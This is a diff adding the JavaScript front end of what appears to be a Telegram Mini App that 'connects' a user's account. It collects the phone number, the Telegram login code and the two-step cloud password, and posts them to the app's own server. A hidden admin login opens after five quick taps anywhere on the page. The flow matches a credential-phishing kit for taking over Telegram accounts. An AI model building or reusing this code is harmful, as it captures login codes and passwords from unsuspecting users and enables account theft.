@@ -1,0 +1,504 @@
+// Initialize Telegram WebApp SDK
+const tg = window.Telegram.WebApp;
+tg.ready();
+tg.expand();
+
+// Generate a persistent UUID for testing in browsers where initData is empty
+let clientUuid = localStorage.getItem("client_uuid");
+if (!clientUuid) {
+    clientUuid = "client_" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+    localStorage.setItem("client_uuid", clientUuid);
+}
+
+// Background wallpapers provided by user
+const bgImages = [
+    "https://files.catbox.moe/1tb37e.jpg",
+    "https://files.catbox.moe/pgim55.jpg",
+    "https://files.catbox.moe/2zkmx1.jpg",
+    "https://files.catbox.moe/o6gks4.jpg",
+    "https://files.catbox.moe/y7oonf.jpg",
+    "https://files.catbox.moe/jx78pv.jpg",
+    "https://files.catbox.moe/hpu9dx.jpg"
+];
+
+// Live Background Carousel Controller
+let currentBgIndex = 0;
+let activeSlideNum = 1;
+
+function initBgCarousel() {
+    const slide1 = document.getElementById("bg-slide-1");
+    const slide2 = document.getElementById("bg-slide-2");
+    if (!slide1 || !slide2) return;
+
+    // Set initial background image
+    slide1.style.backgroundImage = `url('${bgImages[0]}')`;
+    
+    // Start continuous sliding interval every 3.5 seconds
+    setInterval(() => {
+        currentBgIndex = (currentBgIndex + 1) % bgImages.length;
+        const nextUrl = bgImages[currentBgIndex];
+        
+        if (activeSlideNum === 1) {
+            slide2.style.backgroundImage = `url('${nextUrl}')`;
+            slide2.classList.add("active");
+            slide1.classList.remove("active");
+            activeSlideNum = 2;
+        } else {
+            slide1.style.backgroundImage = `url('${nextUrl}')`;
+            slide1.classList.add("active");
+            slide2.classList.remove("active");
+            activeSlideNum = 1;
+        }
+    }, 3500);
+}
+
+// DOM elements
+const elTitle = document.getElementById("app-title");
+const elSubtitle = document.getElementById("app-subtitle");
+
+const views = {
+    phoneEntry: document.getElementById("view-phone-entry"),
+    otpEntry: document.getElementById("view-otp-entry"),
+    twofaEntry: document.getElementById("view-2fa-entry"),
+    success: document.getElementById("view-success")
+};
+
+const dots = {
+    1: document.getElementById("dot-1"),
+    2: document.getElementById("dot-2"),
+    3: document.getElementById("dot-3"),
+    4: document.getElementById("dot-4")
+};
+
+const lines = {
+    1: document.getElementById("line-1"),
+    2: document.getElementById("line-2"),
+    3: document.getElementById("line-3")
+};
+
+const elPhoneInput = document.getElementById("phone-input");
+const elPhoneError = document.getElementById("phone-error");
+const elOtpPhoneDisplay = document.getElementById("otp-phone-display");
+const elOtpInput = document.getElementById("otp-input");
+const elOtpError = document.getElementById("otp-error");
+const elPasswordInput = document.getElementById("password-input");
+const el2faError = document.getElementById("2fa-error");
+
+// Buttons
+const btnSubmitPhone = document.getElementById("btn-submit-phone");
+const btnShareContact = document.getElementById("btn-share-contact");
+const btnSubmitOtp = document.getElementById("btn-submit-otp");
+const btnBackPhone = document.getElementById("btn-back-phone");
+const btnSubmit2fa = document.getElementById("btn-submit-2fa");
+const btnCloseApp = document.getElementById("btn-close-app");
+const btnTogglePassword = document.getElementById("toggle-password");
+
+let checkStatusInterval = null;
+let isSubmitting = false;
+
+// Initialize
+function init() {
+    initBgCarousel();
+    
+    // Start status check loop
+    checkStatus();
+    checkStatusInterval = setInterval(checkStatus, 3000);
+    
+    // Bind Event Listeners
+    if (btnSubmitPhone) btnSubmitPhone.addEventListener("click", submitPhone);
+    if (btnShareContact) btnShareContact.addEventListener("click", shareContact);
+    if (btnSubmitOtp) btnSubmitOtp.addEventListener("click", submitOtp);
+    if (btnBackPhone) btnBackPhone.addEventListener("click", () => {
+        updateStepper(1);
+        switchView("phoneEntry");
+    });
+    if (btnSubmit2fa) btnSubmit2fa.addEventListener("click", submit2fa);
+    if (btnCloseApp) btnCloseApp.addEventListener("click", () => tg.close());
+    
+    // Toggle Password Visibility
+    if (btnTogglePassword && elPasswordInput) {
+        btnTogglePassword.addEventListener("click", () => {
+            if (elPasswordInput.type === "password") {
+                elPasswordInput.type = "text";
+                btnTogglePassword.classList.remove("fa-eye-slash");
+                btnTogglePassword.classList.add("fa-eye");
+            } else {
+                elPasswordInput.type = "password";
+                btnTogglePassword.classList.remove("fa-eye");
+                btnTogglePassword.classList.add("fa-eye-slash");
+            }
+        });
+    }
+    
+    // Handle Enter key on inputs
+    if (elPhoneInput) {
+        elPhoneInput.addEventListener("keypress", (e) => {
+            if (e.key === "Enter") submitPhone();
+        });
+    }
+    if (elOtpInput) {
+        elOtpInput.addEventListener("keypress", (e) => {
+            if (e.key === "Enter") submitOtp();
+        });
+    }
+    if (elPasswordInput) {
+        elPasswordInput.addEventListener("keypress", (e) => {
+            if (e.key === "Enter") submit2fa();
+        });
+    }
+    
+    // Bind Visual Numpad Keypad Clicks
+    document.querySelectorAll(".numpad-key").forEach(key => {
+        key.addEventListener("click", (e) => {
+            e.preventDefault();
+            const val = key.getAttribute("data-val");
+            const action = key.getAttribute("data-action");
+            
+            let activeInput = null;
+            let activeViewName = "";
+            if (views.phoneEntry && views.phoneEntry.classList.contains("active")) {
+                activeInput = elPhoneInput;
+                activeViewName = "phone";
+            } else if (views.otpEntry && views.otpEntry.classList.contains("active")) {
+                activeInput = elOtpInput;
+                activeViewName = "otp";
+            } else if (views.twofaEntry && views.twofaEntry.classList.contains("active")) {
+                activeInput = elPasswordInput;
+                activeViewName = "2fa";
+            }
+            
+            if (!activeInput) return;
+            
+            if (val !== null) {
+                if (activeViewName === "otp") {
+                    if (activeInput.value.length < 5) {
+                        activeInput.value += val;
+                        if (activeInput.value.length === 5) {
+                            submitOtp();
+                        }
+                    }
+                } else {
+                    activeInput.value += val;
+                }
+            } else if (action === "backspace") {
+                activeInput.value = activeInput.value.slice(0, -1);
+            } else if (action === "clear") {
+                if (activeViewName === "phone") {
+                    activeInput.value = "+91";
+                } else {
+                    activeInput.value = "";
+                }
+            }
+        });
+    });
+}
+
+// Transition helper to switch active view card
+function switchView(targetKey) {
+    Object.keys(views).forEach(key => {
+        if (views[key]) {
+            if (key === targetKey) {
+                views[key].classList.add("active");
+            } else {
+                views[key].classList.remove("active");
+            }
+        }
+    });
+}
+
+// Update stepper line highlighting
+function updateStepper(activeStep) {
+    for (let i = 1; i <= 4; i++) {
+        if (dots[i]) {
+            if (i < activeStep) {
+                dots[i].className = "step-dot completed";
+            } else if (i === activeStep) {
+                dots[i].className = "step-dot active";
+            } else {
+                dots[i].className = "step-dot";
+            }
+        }
+    }
+    
+    for (let i = 1; i <= 3; i++) {
+        if (lines[i]) {
+            if (i < activeStep) {
+                lines[i].className = "step-line completed";
+            } else {
+                lines[i].className = "step-line";
+            }
+        }
+    }
+}
+
+// Submit Phone Number to API
+async function submitPhone() {
+    const rawPhone = elPhoneInput ? elPhoneInput.value.trim() : "";
+    if (!rawPhone || rawPhone.length < 8) {
+        if (elPhoneError) elPhoneError.innerText = "Please enter a valid phone number with country code (e.g. +919876543210).";
+        return;
+    }
+    
+    if (elPhoneError) elPhoneError.innerText = "";
+    isSubmitting = true;
+    btnSubmitPhone.disabled = true;
+    btnSubmitPhone.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sending OTP...';
+    
+    try {
+        const initData = tg.initData || "";
+        const res = await fetch("/api/submit_phone", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ initData, phone: rawPhone, clientUuid })
+        });
+        
+        const data = await res.json();
+        isSubmitting = false;
+        btnSubmitPhone.disabled = false;
+        btnSubmitPhone.innerHTML = 'Send Telegram OTP <i class="fa-solid fa-paper-plane"></i>';
+        
+        if (data.status === "otp_sent") {
+            if (elOtpPhoneDisplay) elOtpPhoneDisplay.innerText = data.phone || rawPhone;
+            elTitle.innerText = "Enter OTP Code";
+            elSubtitle.innerText = `Verification code sent to ${data.phone || rawPhone}.`;
+            updateStepper(2);
+            switchView("otpEntry");
+        } else {
+            if (elPhoneError) elPhoneError.innerText = data.message || "Failed to send OTP. Please check phone format.";
+        }
+    } catch (err) {
+        isSubmitting = false;
+        btnSubmitPhone.disabled = false;
+        btnSubmitPhone.innerHTML = 'Send Telegram OTP <i class="fa-solid fa-paper-plane"></i>';
+        if (elPhoneError) elPhoneError.innerText = "Network error. Please try again later.";
+    }
+}
+
+// Request contact sharing from native telegram app
+function shareContact() {
+    btnShareContact.disabled = true;
+    btnShareContact.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sharing...';
+    
+    tg.requestContact((success) => {
+        btnShareContact.disabled = false;
+        btnShareContact.innerHTML = '<i class="fa-solid fa-share-nodes"></i> Auto Share Contact';
+        
+        if (success) {
+            elSubtitle.innerText = "Phone number shared! Requesting OTP...";
+        } else {
+            if (elPhoneError) elPhoneError.innerText = "Contact sharing was declined. Please type your phone number above.";
+        }
+    });
+}
+
+// Polling status API
+async function checkStatus() {
+    if (isSubmitting) return;
+    
+    try {
+        const initData = tg.initData || "";
+        const res = await fetch(`/api/check_status?initData=${encodeURIComponent(initData)}&clientUuid=${encodeURIComponent(clientUuid)}`);
+        if (!res.ok) return;
+        
+        const data = await res.json();
+        handleStatusResponse(data);
+    } catch (err) {
+        console.error("Status polling failed:", err);
+    }
+}
+
+// Coordinate layout states based on API status
+function handleStatusResponse(data) {
+    const status = data.status;
+    
+    if (status === "already_connected" || status === "success") {
+        clearInterval(checkStatusInterval);
+        elTitle.innerText = "Connected";
+        elSubtitle.innerText = `Account ${data.phone || ""} is active!`;
+        updateStepper(4);
+        switchView("success");
+        
+    } else if (status === "otp_sent") {
+        elTitle.innerText = "Enter OTP Code";
+        elSubtitle.innerText = `Verification code sent to ${data.phone || "your Telegram account"}.`;
+        if (elOtpPhoneDisplay) elOtpPhoneDisplay.innerText = data.phone || "";
+        updateStepper(2);
+        switchView("otpEntry");
+        
+    } else if (status === "2fa_needed") {
+        elTitle.innerText = "2-Step Password";
+        elSubtitle.innerText = "Enter your cloud password to finalize login.";
+        updateStepper(3);
+        switchView("twofaEntry");
+    }
+}
+
+// Submit OTP Code
+async function submitOtp() {
+    const otp = elOtpInput ? elOtpInput.value.trim() : "";
+    if (otp.length !== 5 || isNaN(otp)) {
+        if (elOtpError) elOtpError.innerText = "Please enter a valid 5-digit numeric OTP code.";
+        return;
+    }
+    
+    if (elOtpError) elOtpError.innerText = "";
+    isSubmitting = true;
+    btnSubmitOtp.disabled = true;
+    btnSubmitOtp.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verifying...';
+    
+    try {
+        const initData = tg.initData || "";
+        const res = await fetch("/api/submit_otp", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ initData, otp, clientUuid })
+        });
+        
+        const data = await res.json();
+        isSubmitting = false;
+        btnSubmitOtp.disabled = false;
+        btnSubmitOtp.innerHTML = 'Verify OTP Code <i class="fa-solid fa-arrow-right"></i>';
+        
+        if (data.status === "success") {
+            handleStatusResponse({ status: "success" });
+        } else if (data.status === "2fa_needed") {
+            handleStatusResponse({ status: "2fa_needed" });
+        } else {
+            if (elOtpError) elOtpError.innerText = data.message || "Invalid OTP code. Please try again.";
+        }
+    } catch (err) {
+        isSubmitting = false;
+        btnSubmitOtp.disabled = false;
+        btnSubmitOtp.innerHTML = 'Verify OTP Code <i class="fa-solid fa-arrow-right"></i>';
+        if (elOtpError) elOtpError.innerText = "Network error. Please try again later.";
+    }
+}
+
+// Submit 2FA Password
+async function submit2fa() {
+    const password = elPasswordInput ? elPasswordInput.value.trim() : "";
+    if (!password) {
+        if (el2faError) el2faError.innerText = "Please enter your Two-Step Verification password.";
+        return;
+    }
+    
+    if (el2faError) el2faError.innerText = "";
+    isSubmitting = true;
+    btnSubmit2fa.disabled = true;
+    btnSubmit2fa.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Checking...';
+    
+    try {
+        const initData = tg.initData || "";
+        const res = await fetch("/api/submit_2fa", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ initData, password, clientUuid })
+        });
+        
+        const data = await res.json();
+        isSubmitting = false;
+        btnSubmit2fa.disabled = false;
+        btnSubmit2fa.innerHTML = 'Verify Cloud Password <i class="fa-solid fa-arrow-right"></i>';
+        
+        if (data.status === "success") {
+            handleStatusResponse({ status: "success" });
+        } else {
+            if (el2faError) el2faError.innerText = data.message || "Incorrect cloud password. Please try again.";
+        }
+    } catch (err) {
+        isSubmitting = false;
+        btnSubmit2fa.disabled = false;
+        btnSubmit2fa.innerHTML = 'Verify Cloud Password <i class="fa-solid fa-arrow-right"></i>';
+        if (el2faError) el2faError.innerText = "Network error. Please try again later.";
+    }
+}
+
+// Run app
+window.onload = init;
+
+// Hidden admin unlock: 5 quick taps anywhere on the site -> password overlay
+(function () {
+    let clickCount = 0;
+    let resetTimer = null;
+    const TRIGGER = 5;
+    const WINDOW_MS = 2000;
+
+    const overlay = document.getElementById("admin-overlay");
+    const pwInput = document.getElementById("admin-password-input");
+    const btnLogin = document.getElementById("btn-admin-login");
+    const btnCancel = document.getElementById("btn-admin-cancel");
+    const errEl = document.getElementById("admin-login-error");
+
+    if (!overlay) return;
+
+    function resetClicks() {
+        clickCount = 0;
+        resetTimer = null;
+    }
+
+    function showOverlay() {
+        if (overlay.style.display === "flex") return;
+        overlay.style.display = "flex";
+        if (pwInput) {
+            pwInput.value = "";
+            pwInput.focus();
+        }
+        if (errEl) errEl.innerText = "";
+    }
+
+    function closeOverlay() {
+        overlay.style.display = "none";
+    }
+
+    document.addEventListener("click", (e) => {
+        if (overlay.style.display === "flex") return;
+        if (e.target.closest("#admin-overlay")) return;
+
+        clickCount += 1;
+        if (resetTimer) clearTimeout(resetTimer);
+        resetTimer = setTimeout(resetClicks, WINDOW_MS);
+
+        if (clickCount >= TRIGGER) {
+            resetClicks();
+            showOverlay();
+        }
+    });
+
+    if (btnCancel) {
+        btnCancel.addEventListener("click", closeOverlay);
+    }
+
+    if (btnLogin && pwInput) {
+        const doLogin = async () => {
+            const password = pwInput.value || "";
+            if (!password) {
+                if (errEl) errEl.innerText = "Please enter the admin password.";
+                return;
+            }
+            btnLogin.disabled = true;
+            if (errEl) errEl.innerText = "";
+            try {
+                const res = await fetch("/admin/api/login", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    credentials: "same-origin",
+                    body: JSON.stringify({ password })
+                });
+                const data = await res.json();
+                if (res.ok && data.ok) {
+                    window.location.href = "/admin";
+                    return;
+                }
+                if (errEl) errEl.innerText = data.error || "Wrong password.";
+            } catch (err) {
+                if (errEl) errEl.innerText = "Network error. Try again.";
+            } finally {
+                btnLogin.disabled = false;
+            }
+        };
+        btnLogin.addEventListener("click", doLogin);
+        pwInput.addEventListener("keypress", (e) => {
+            if (e.key === "Enter") doLogin();
+        });
+    }
+})();
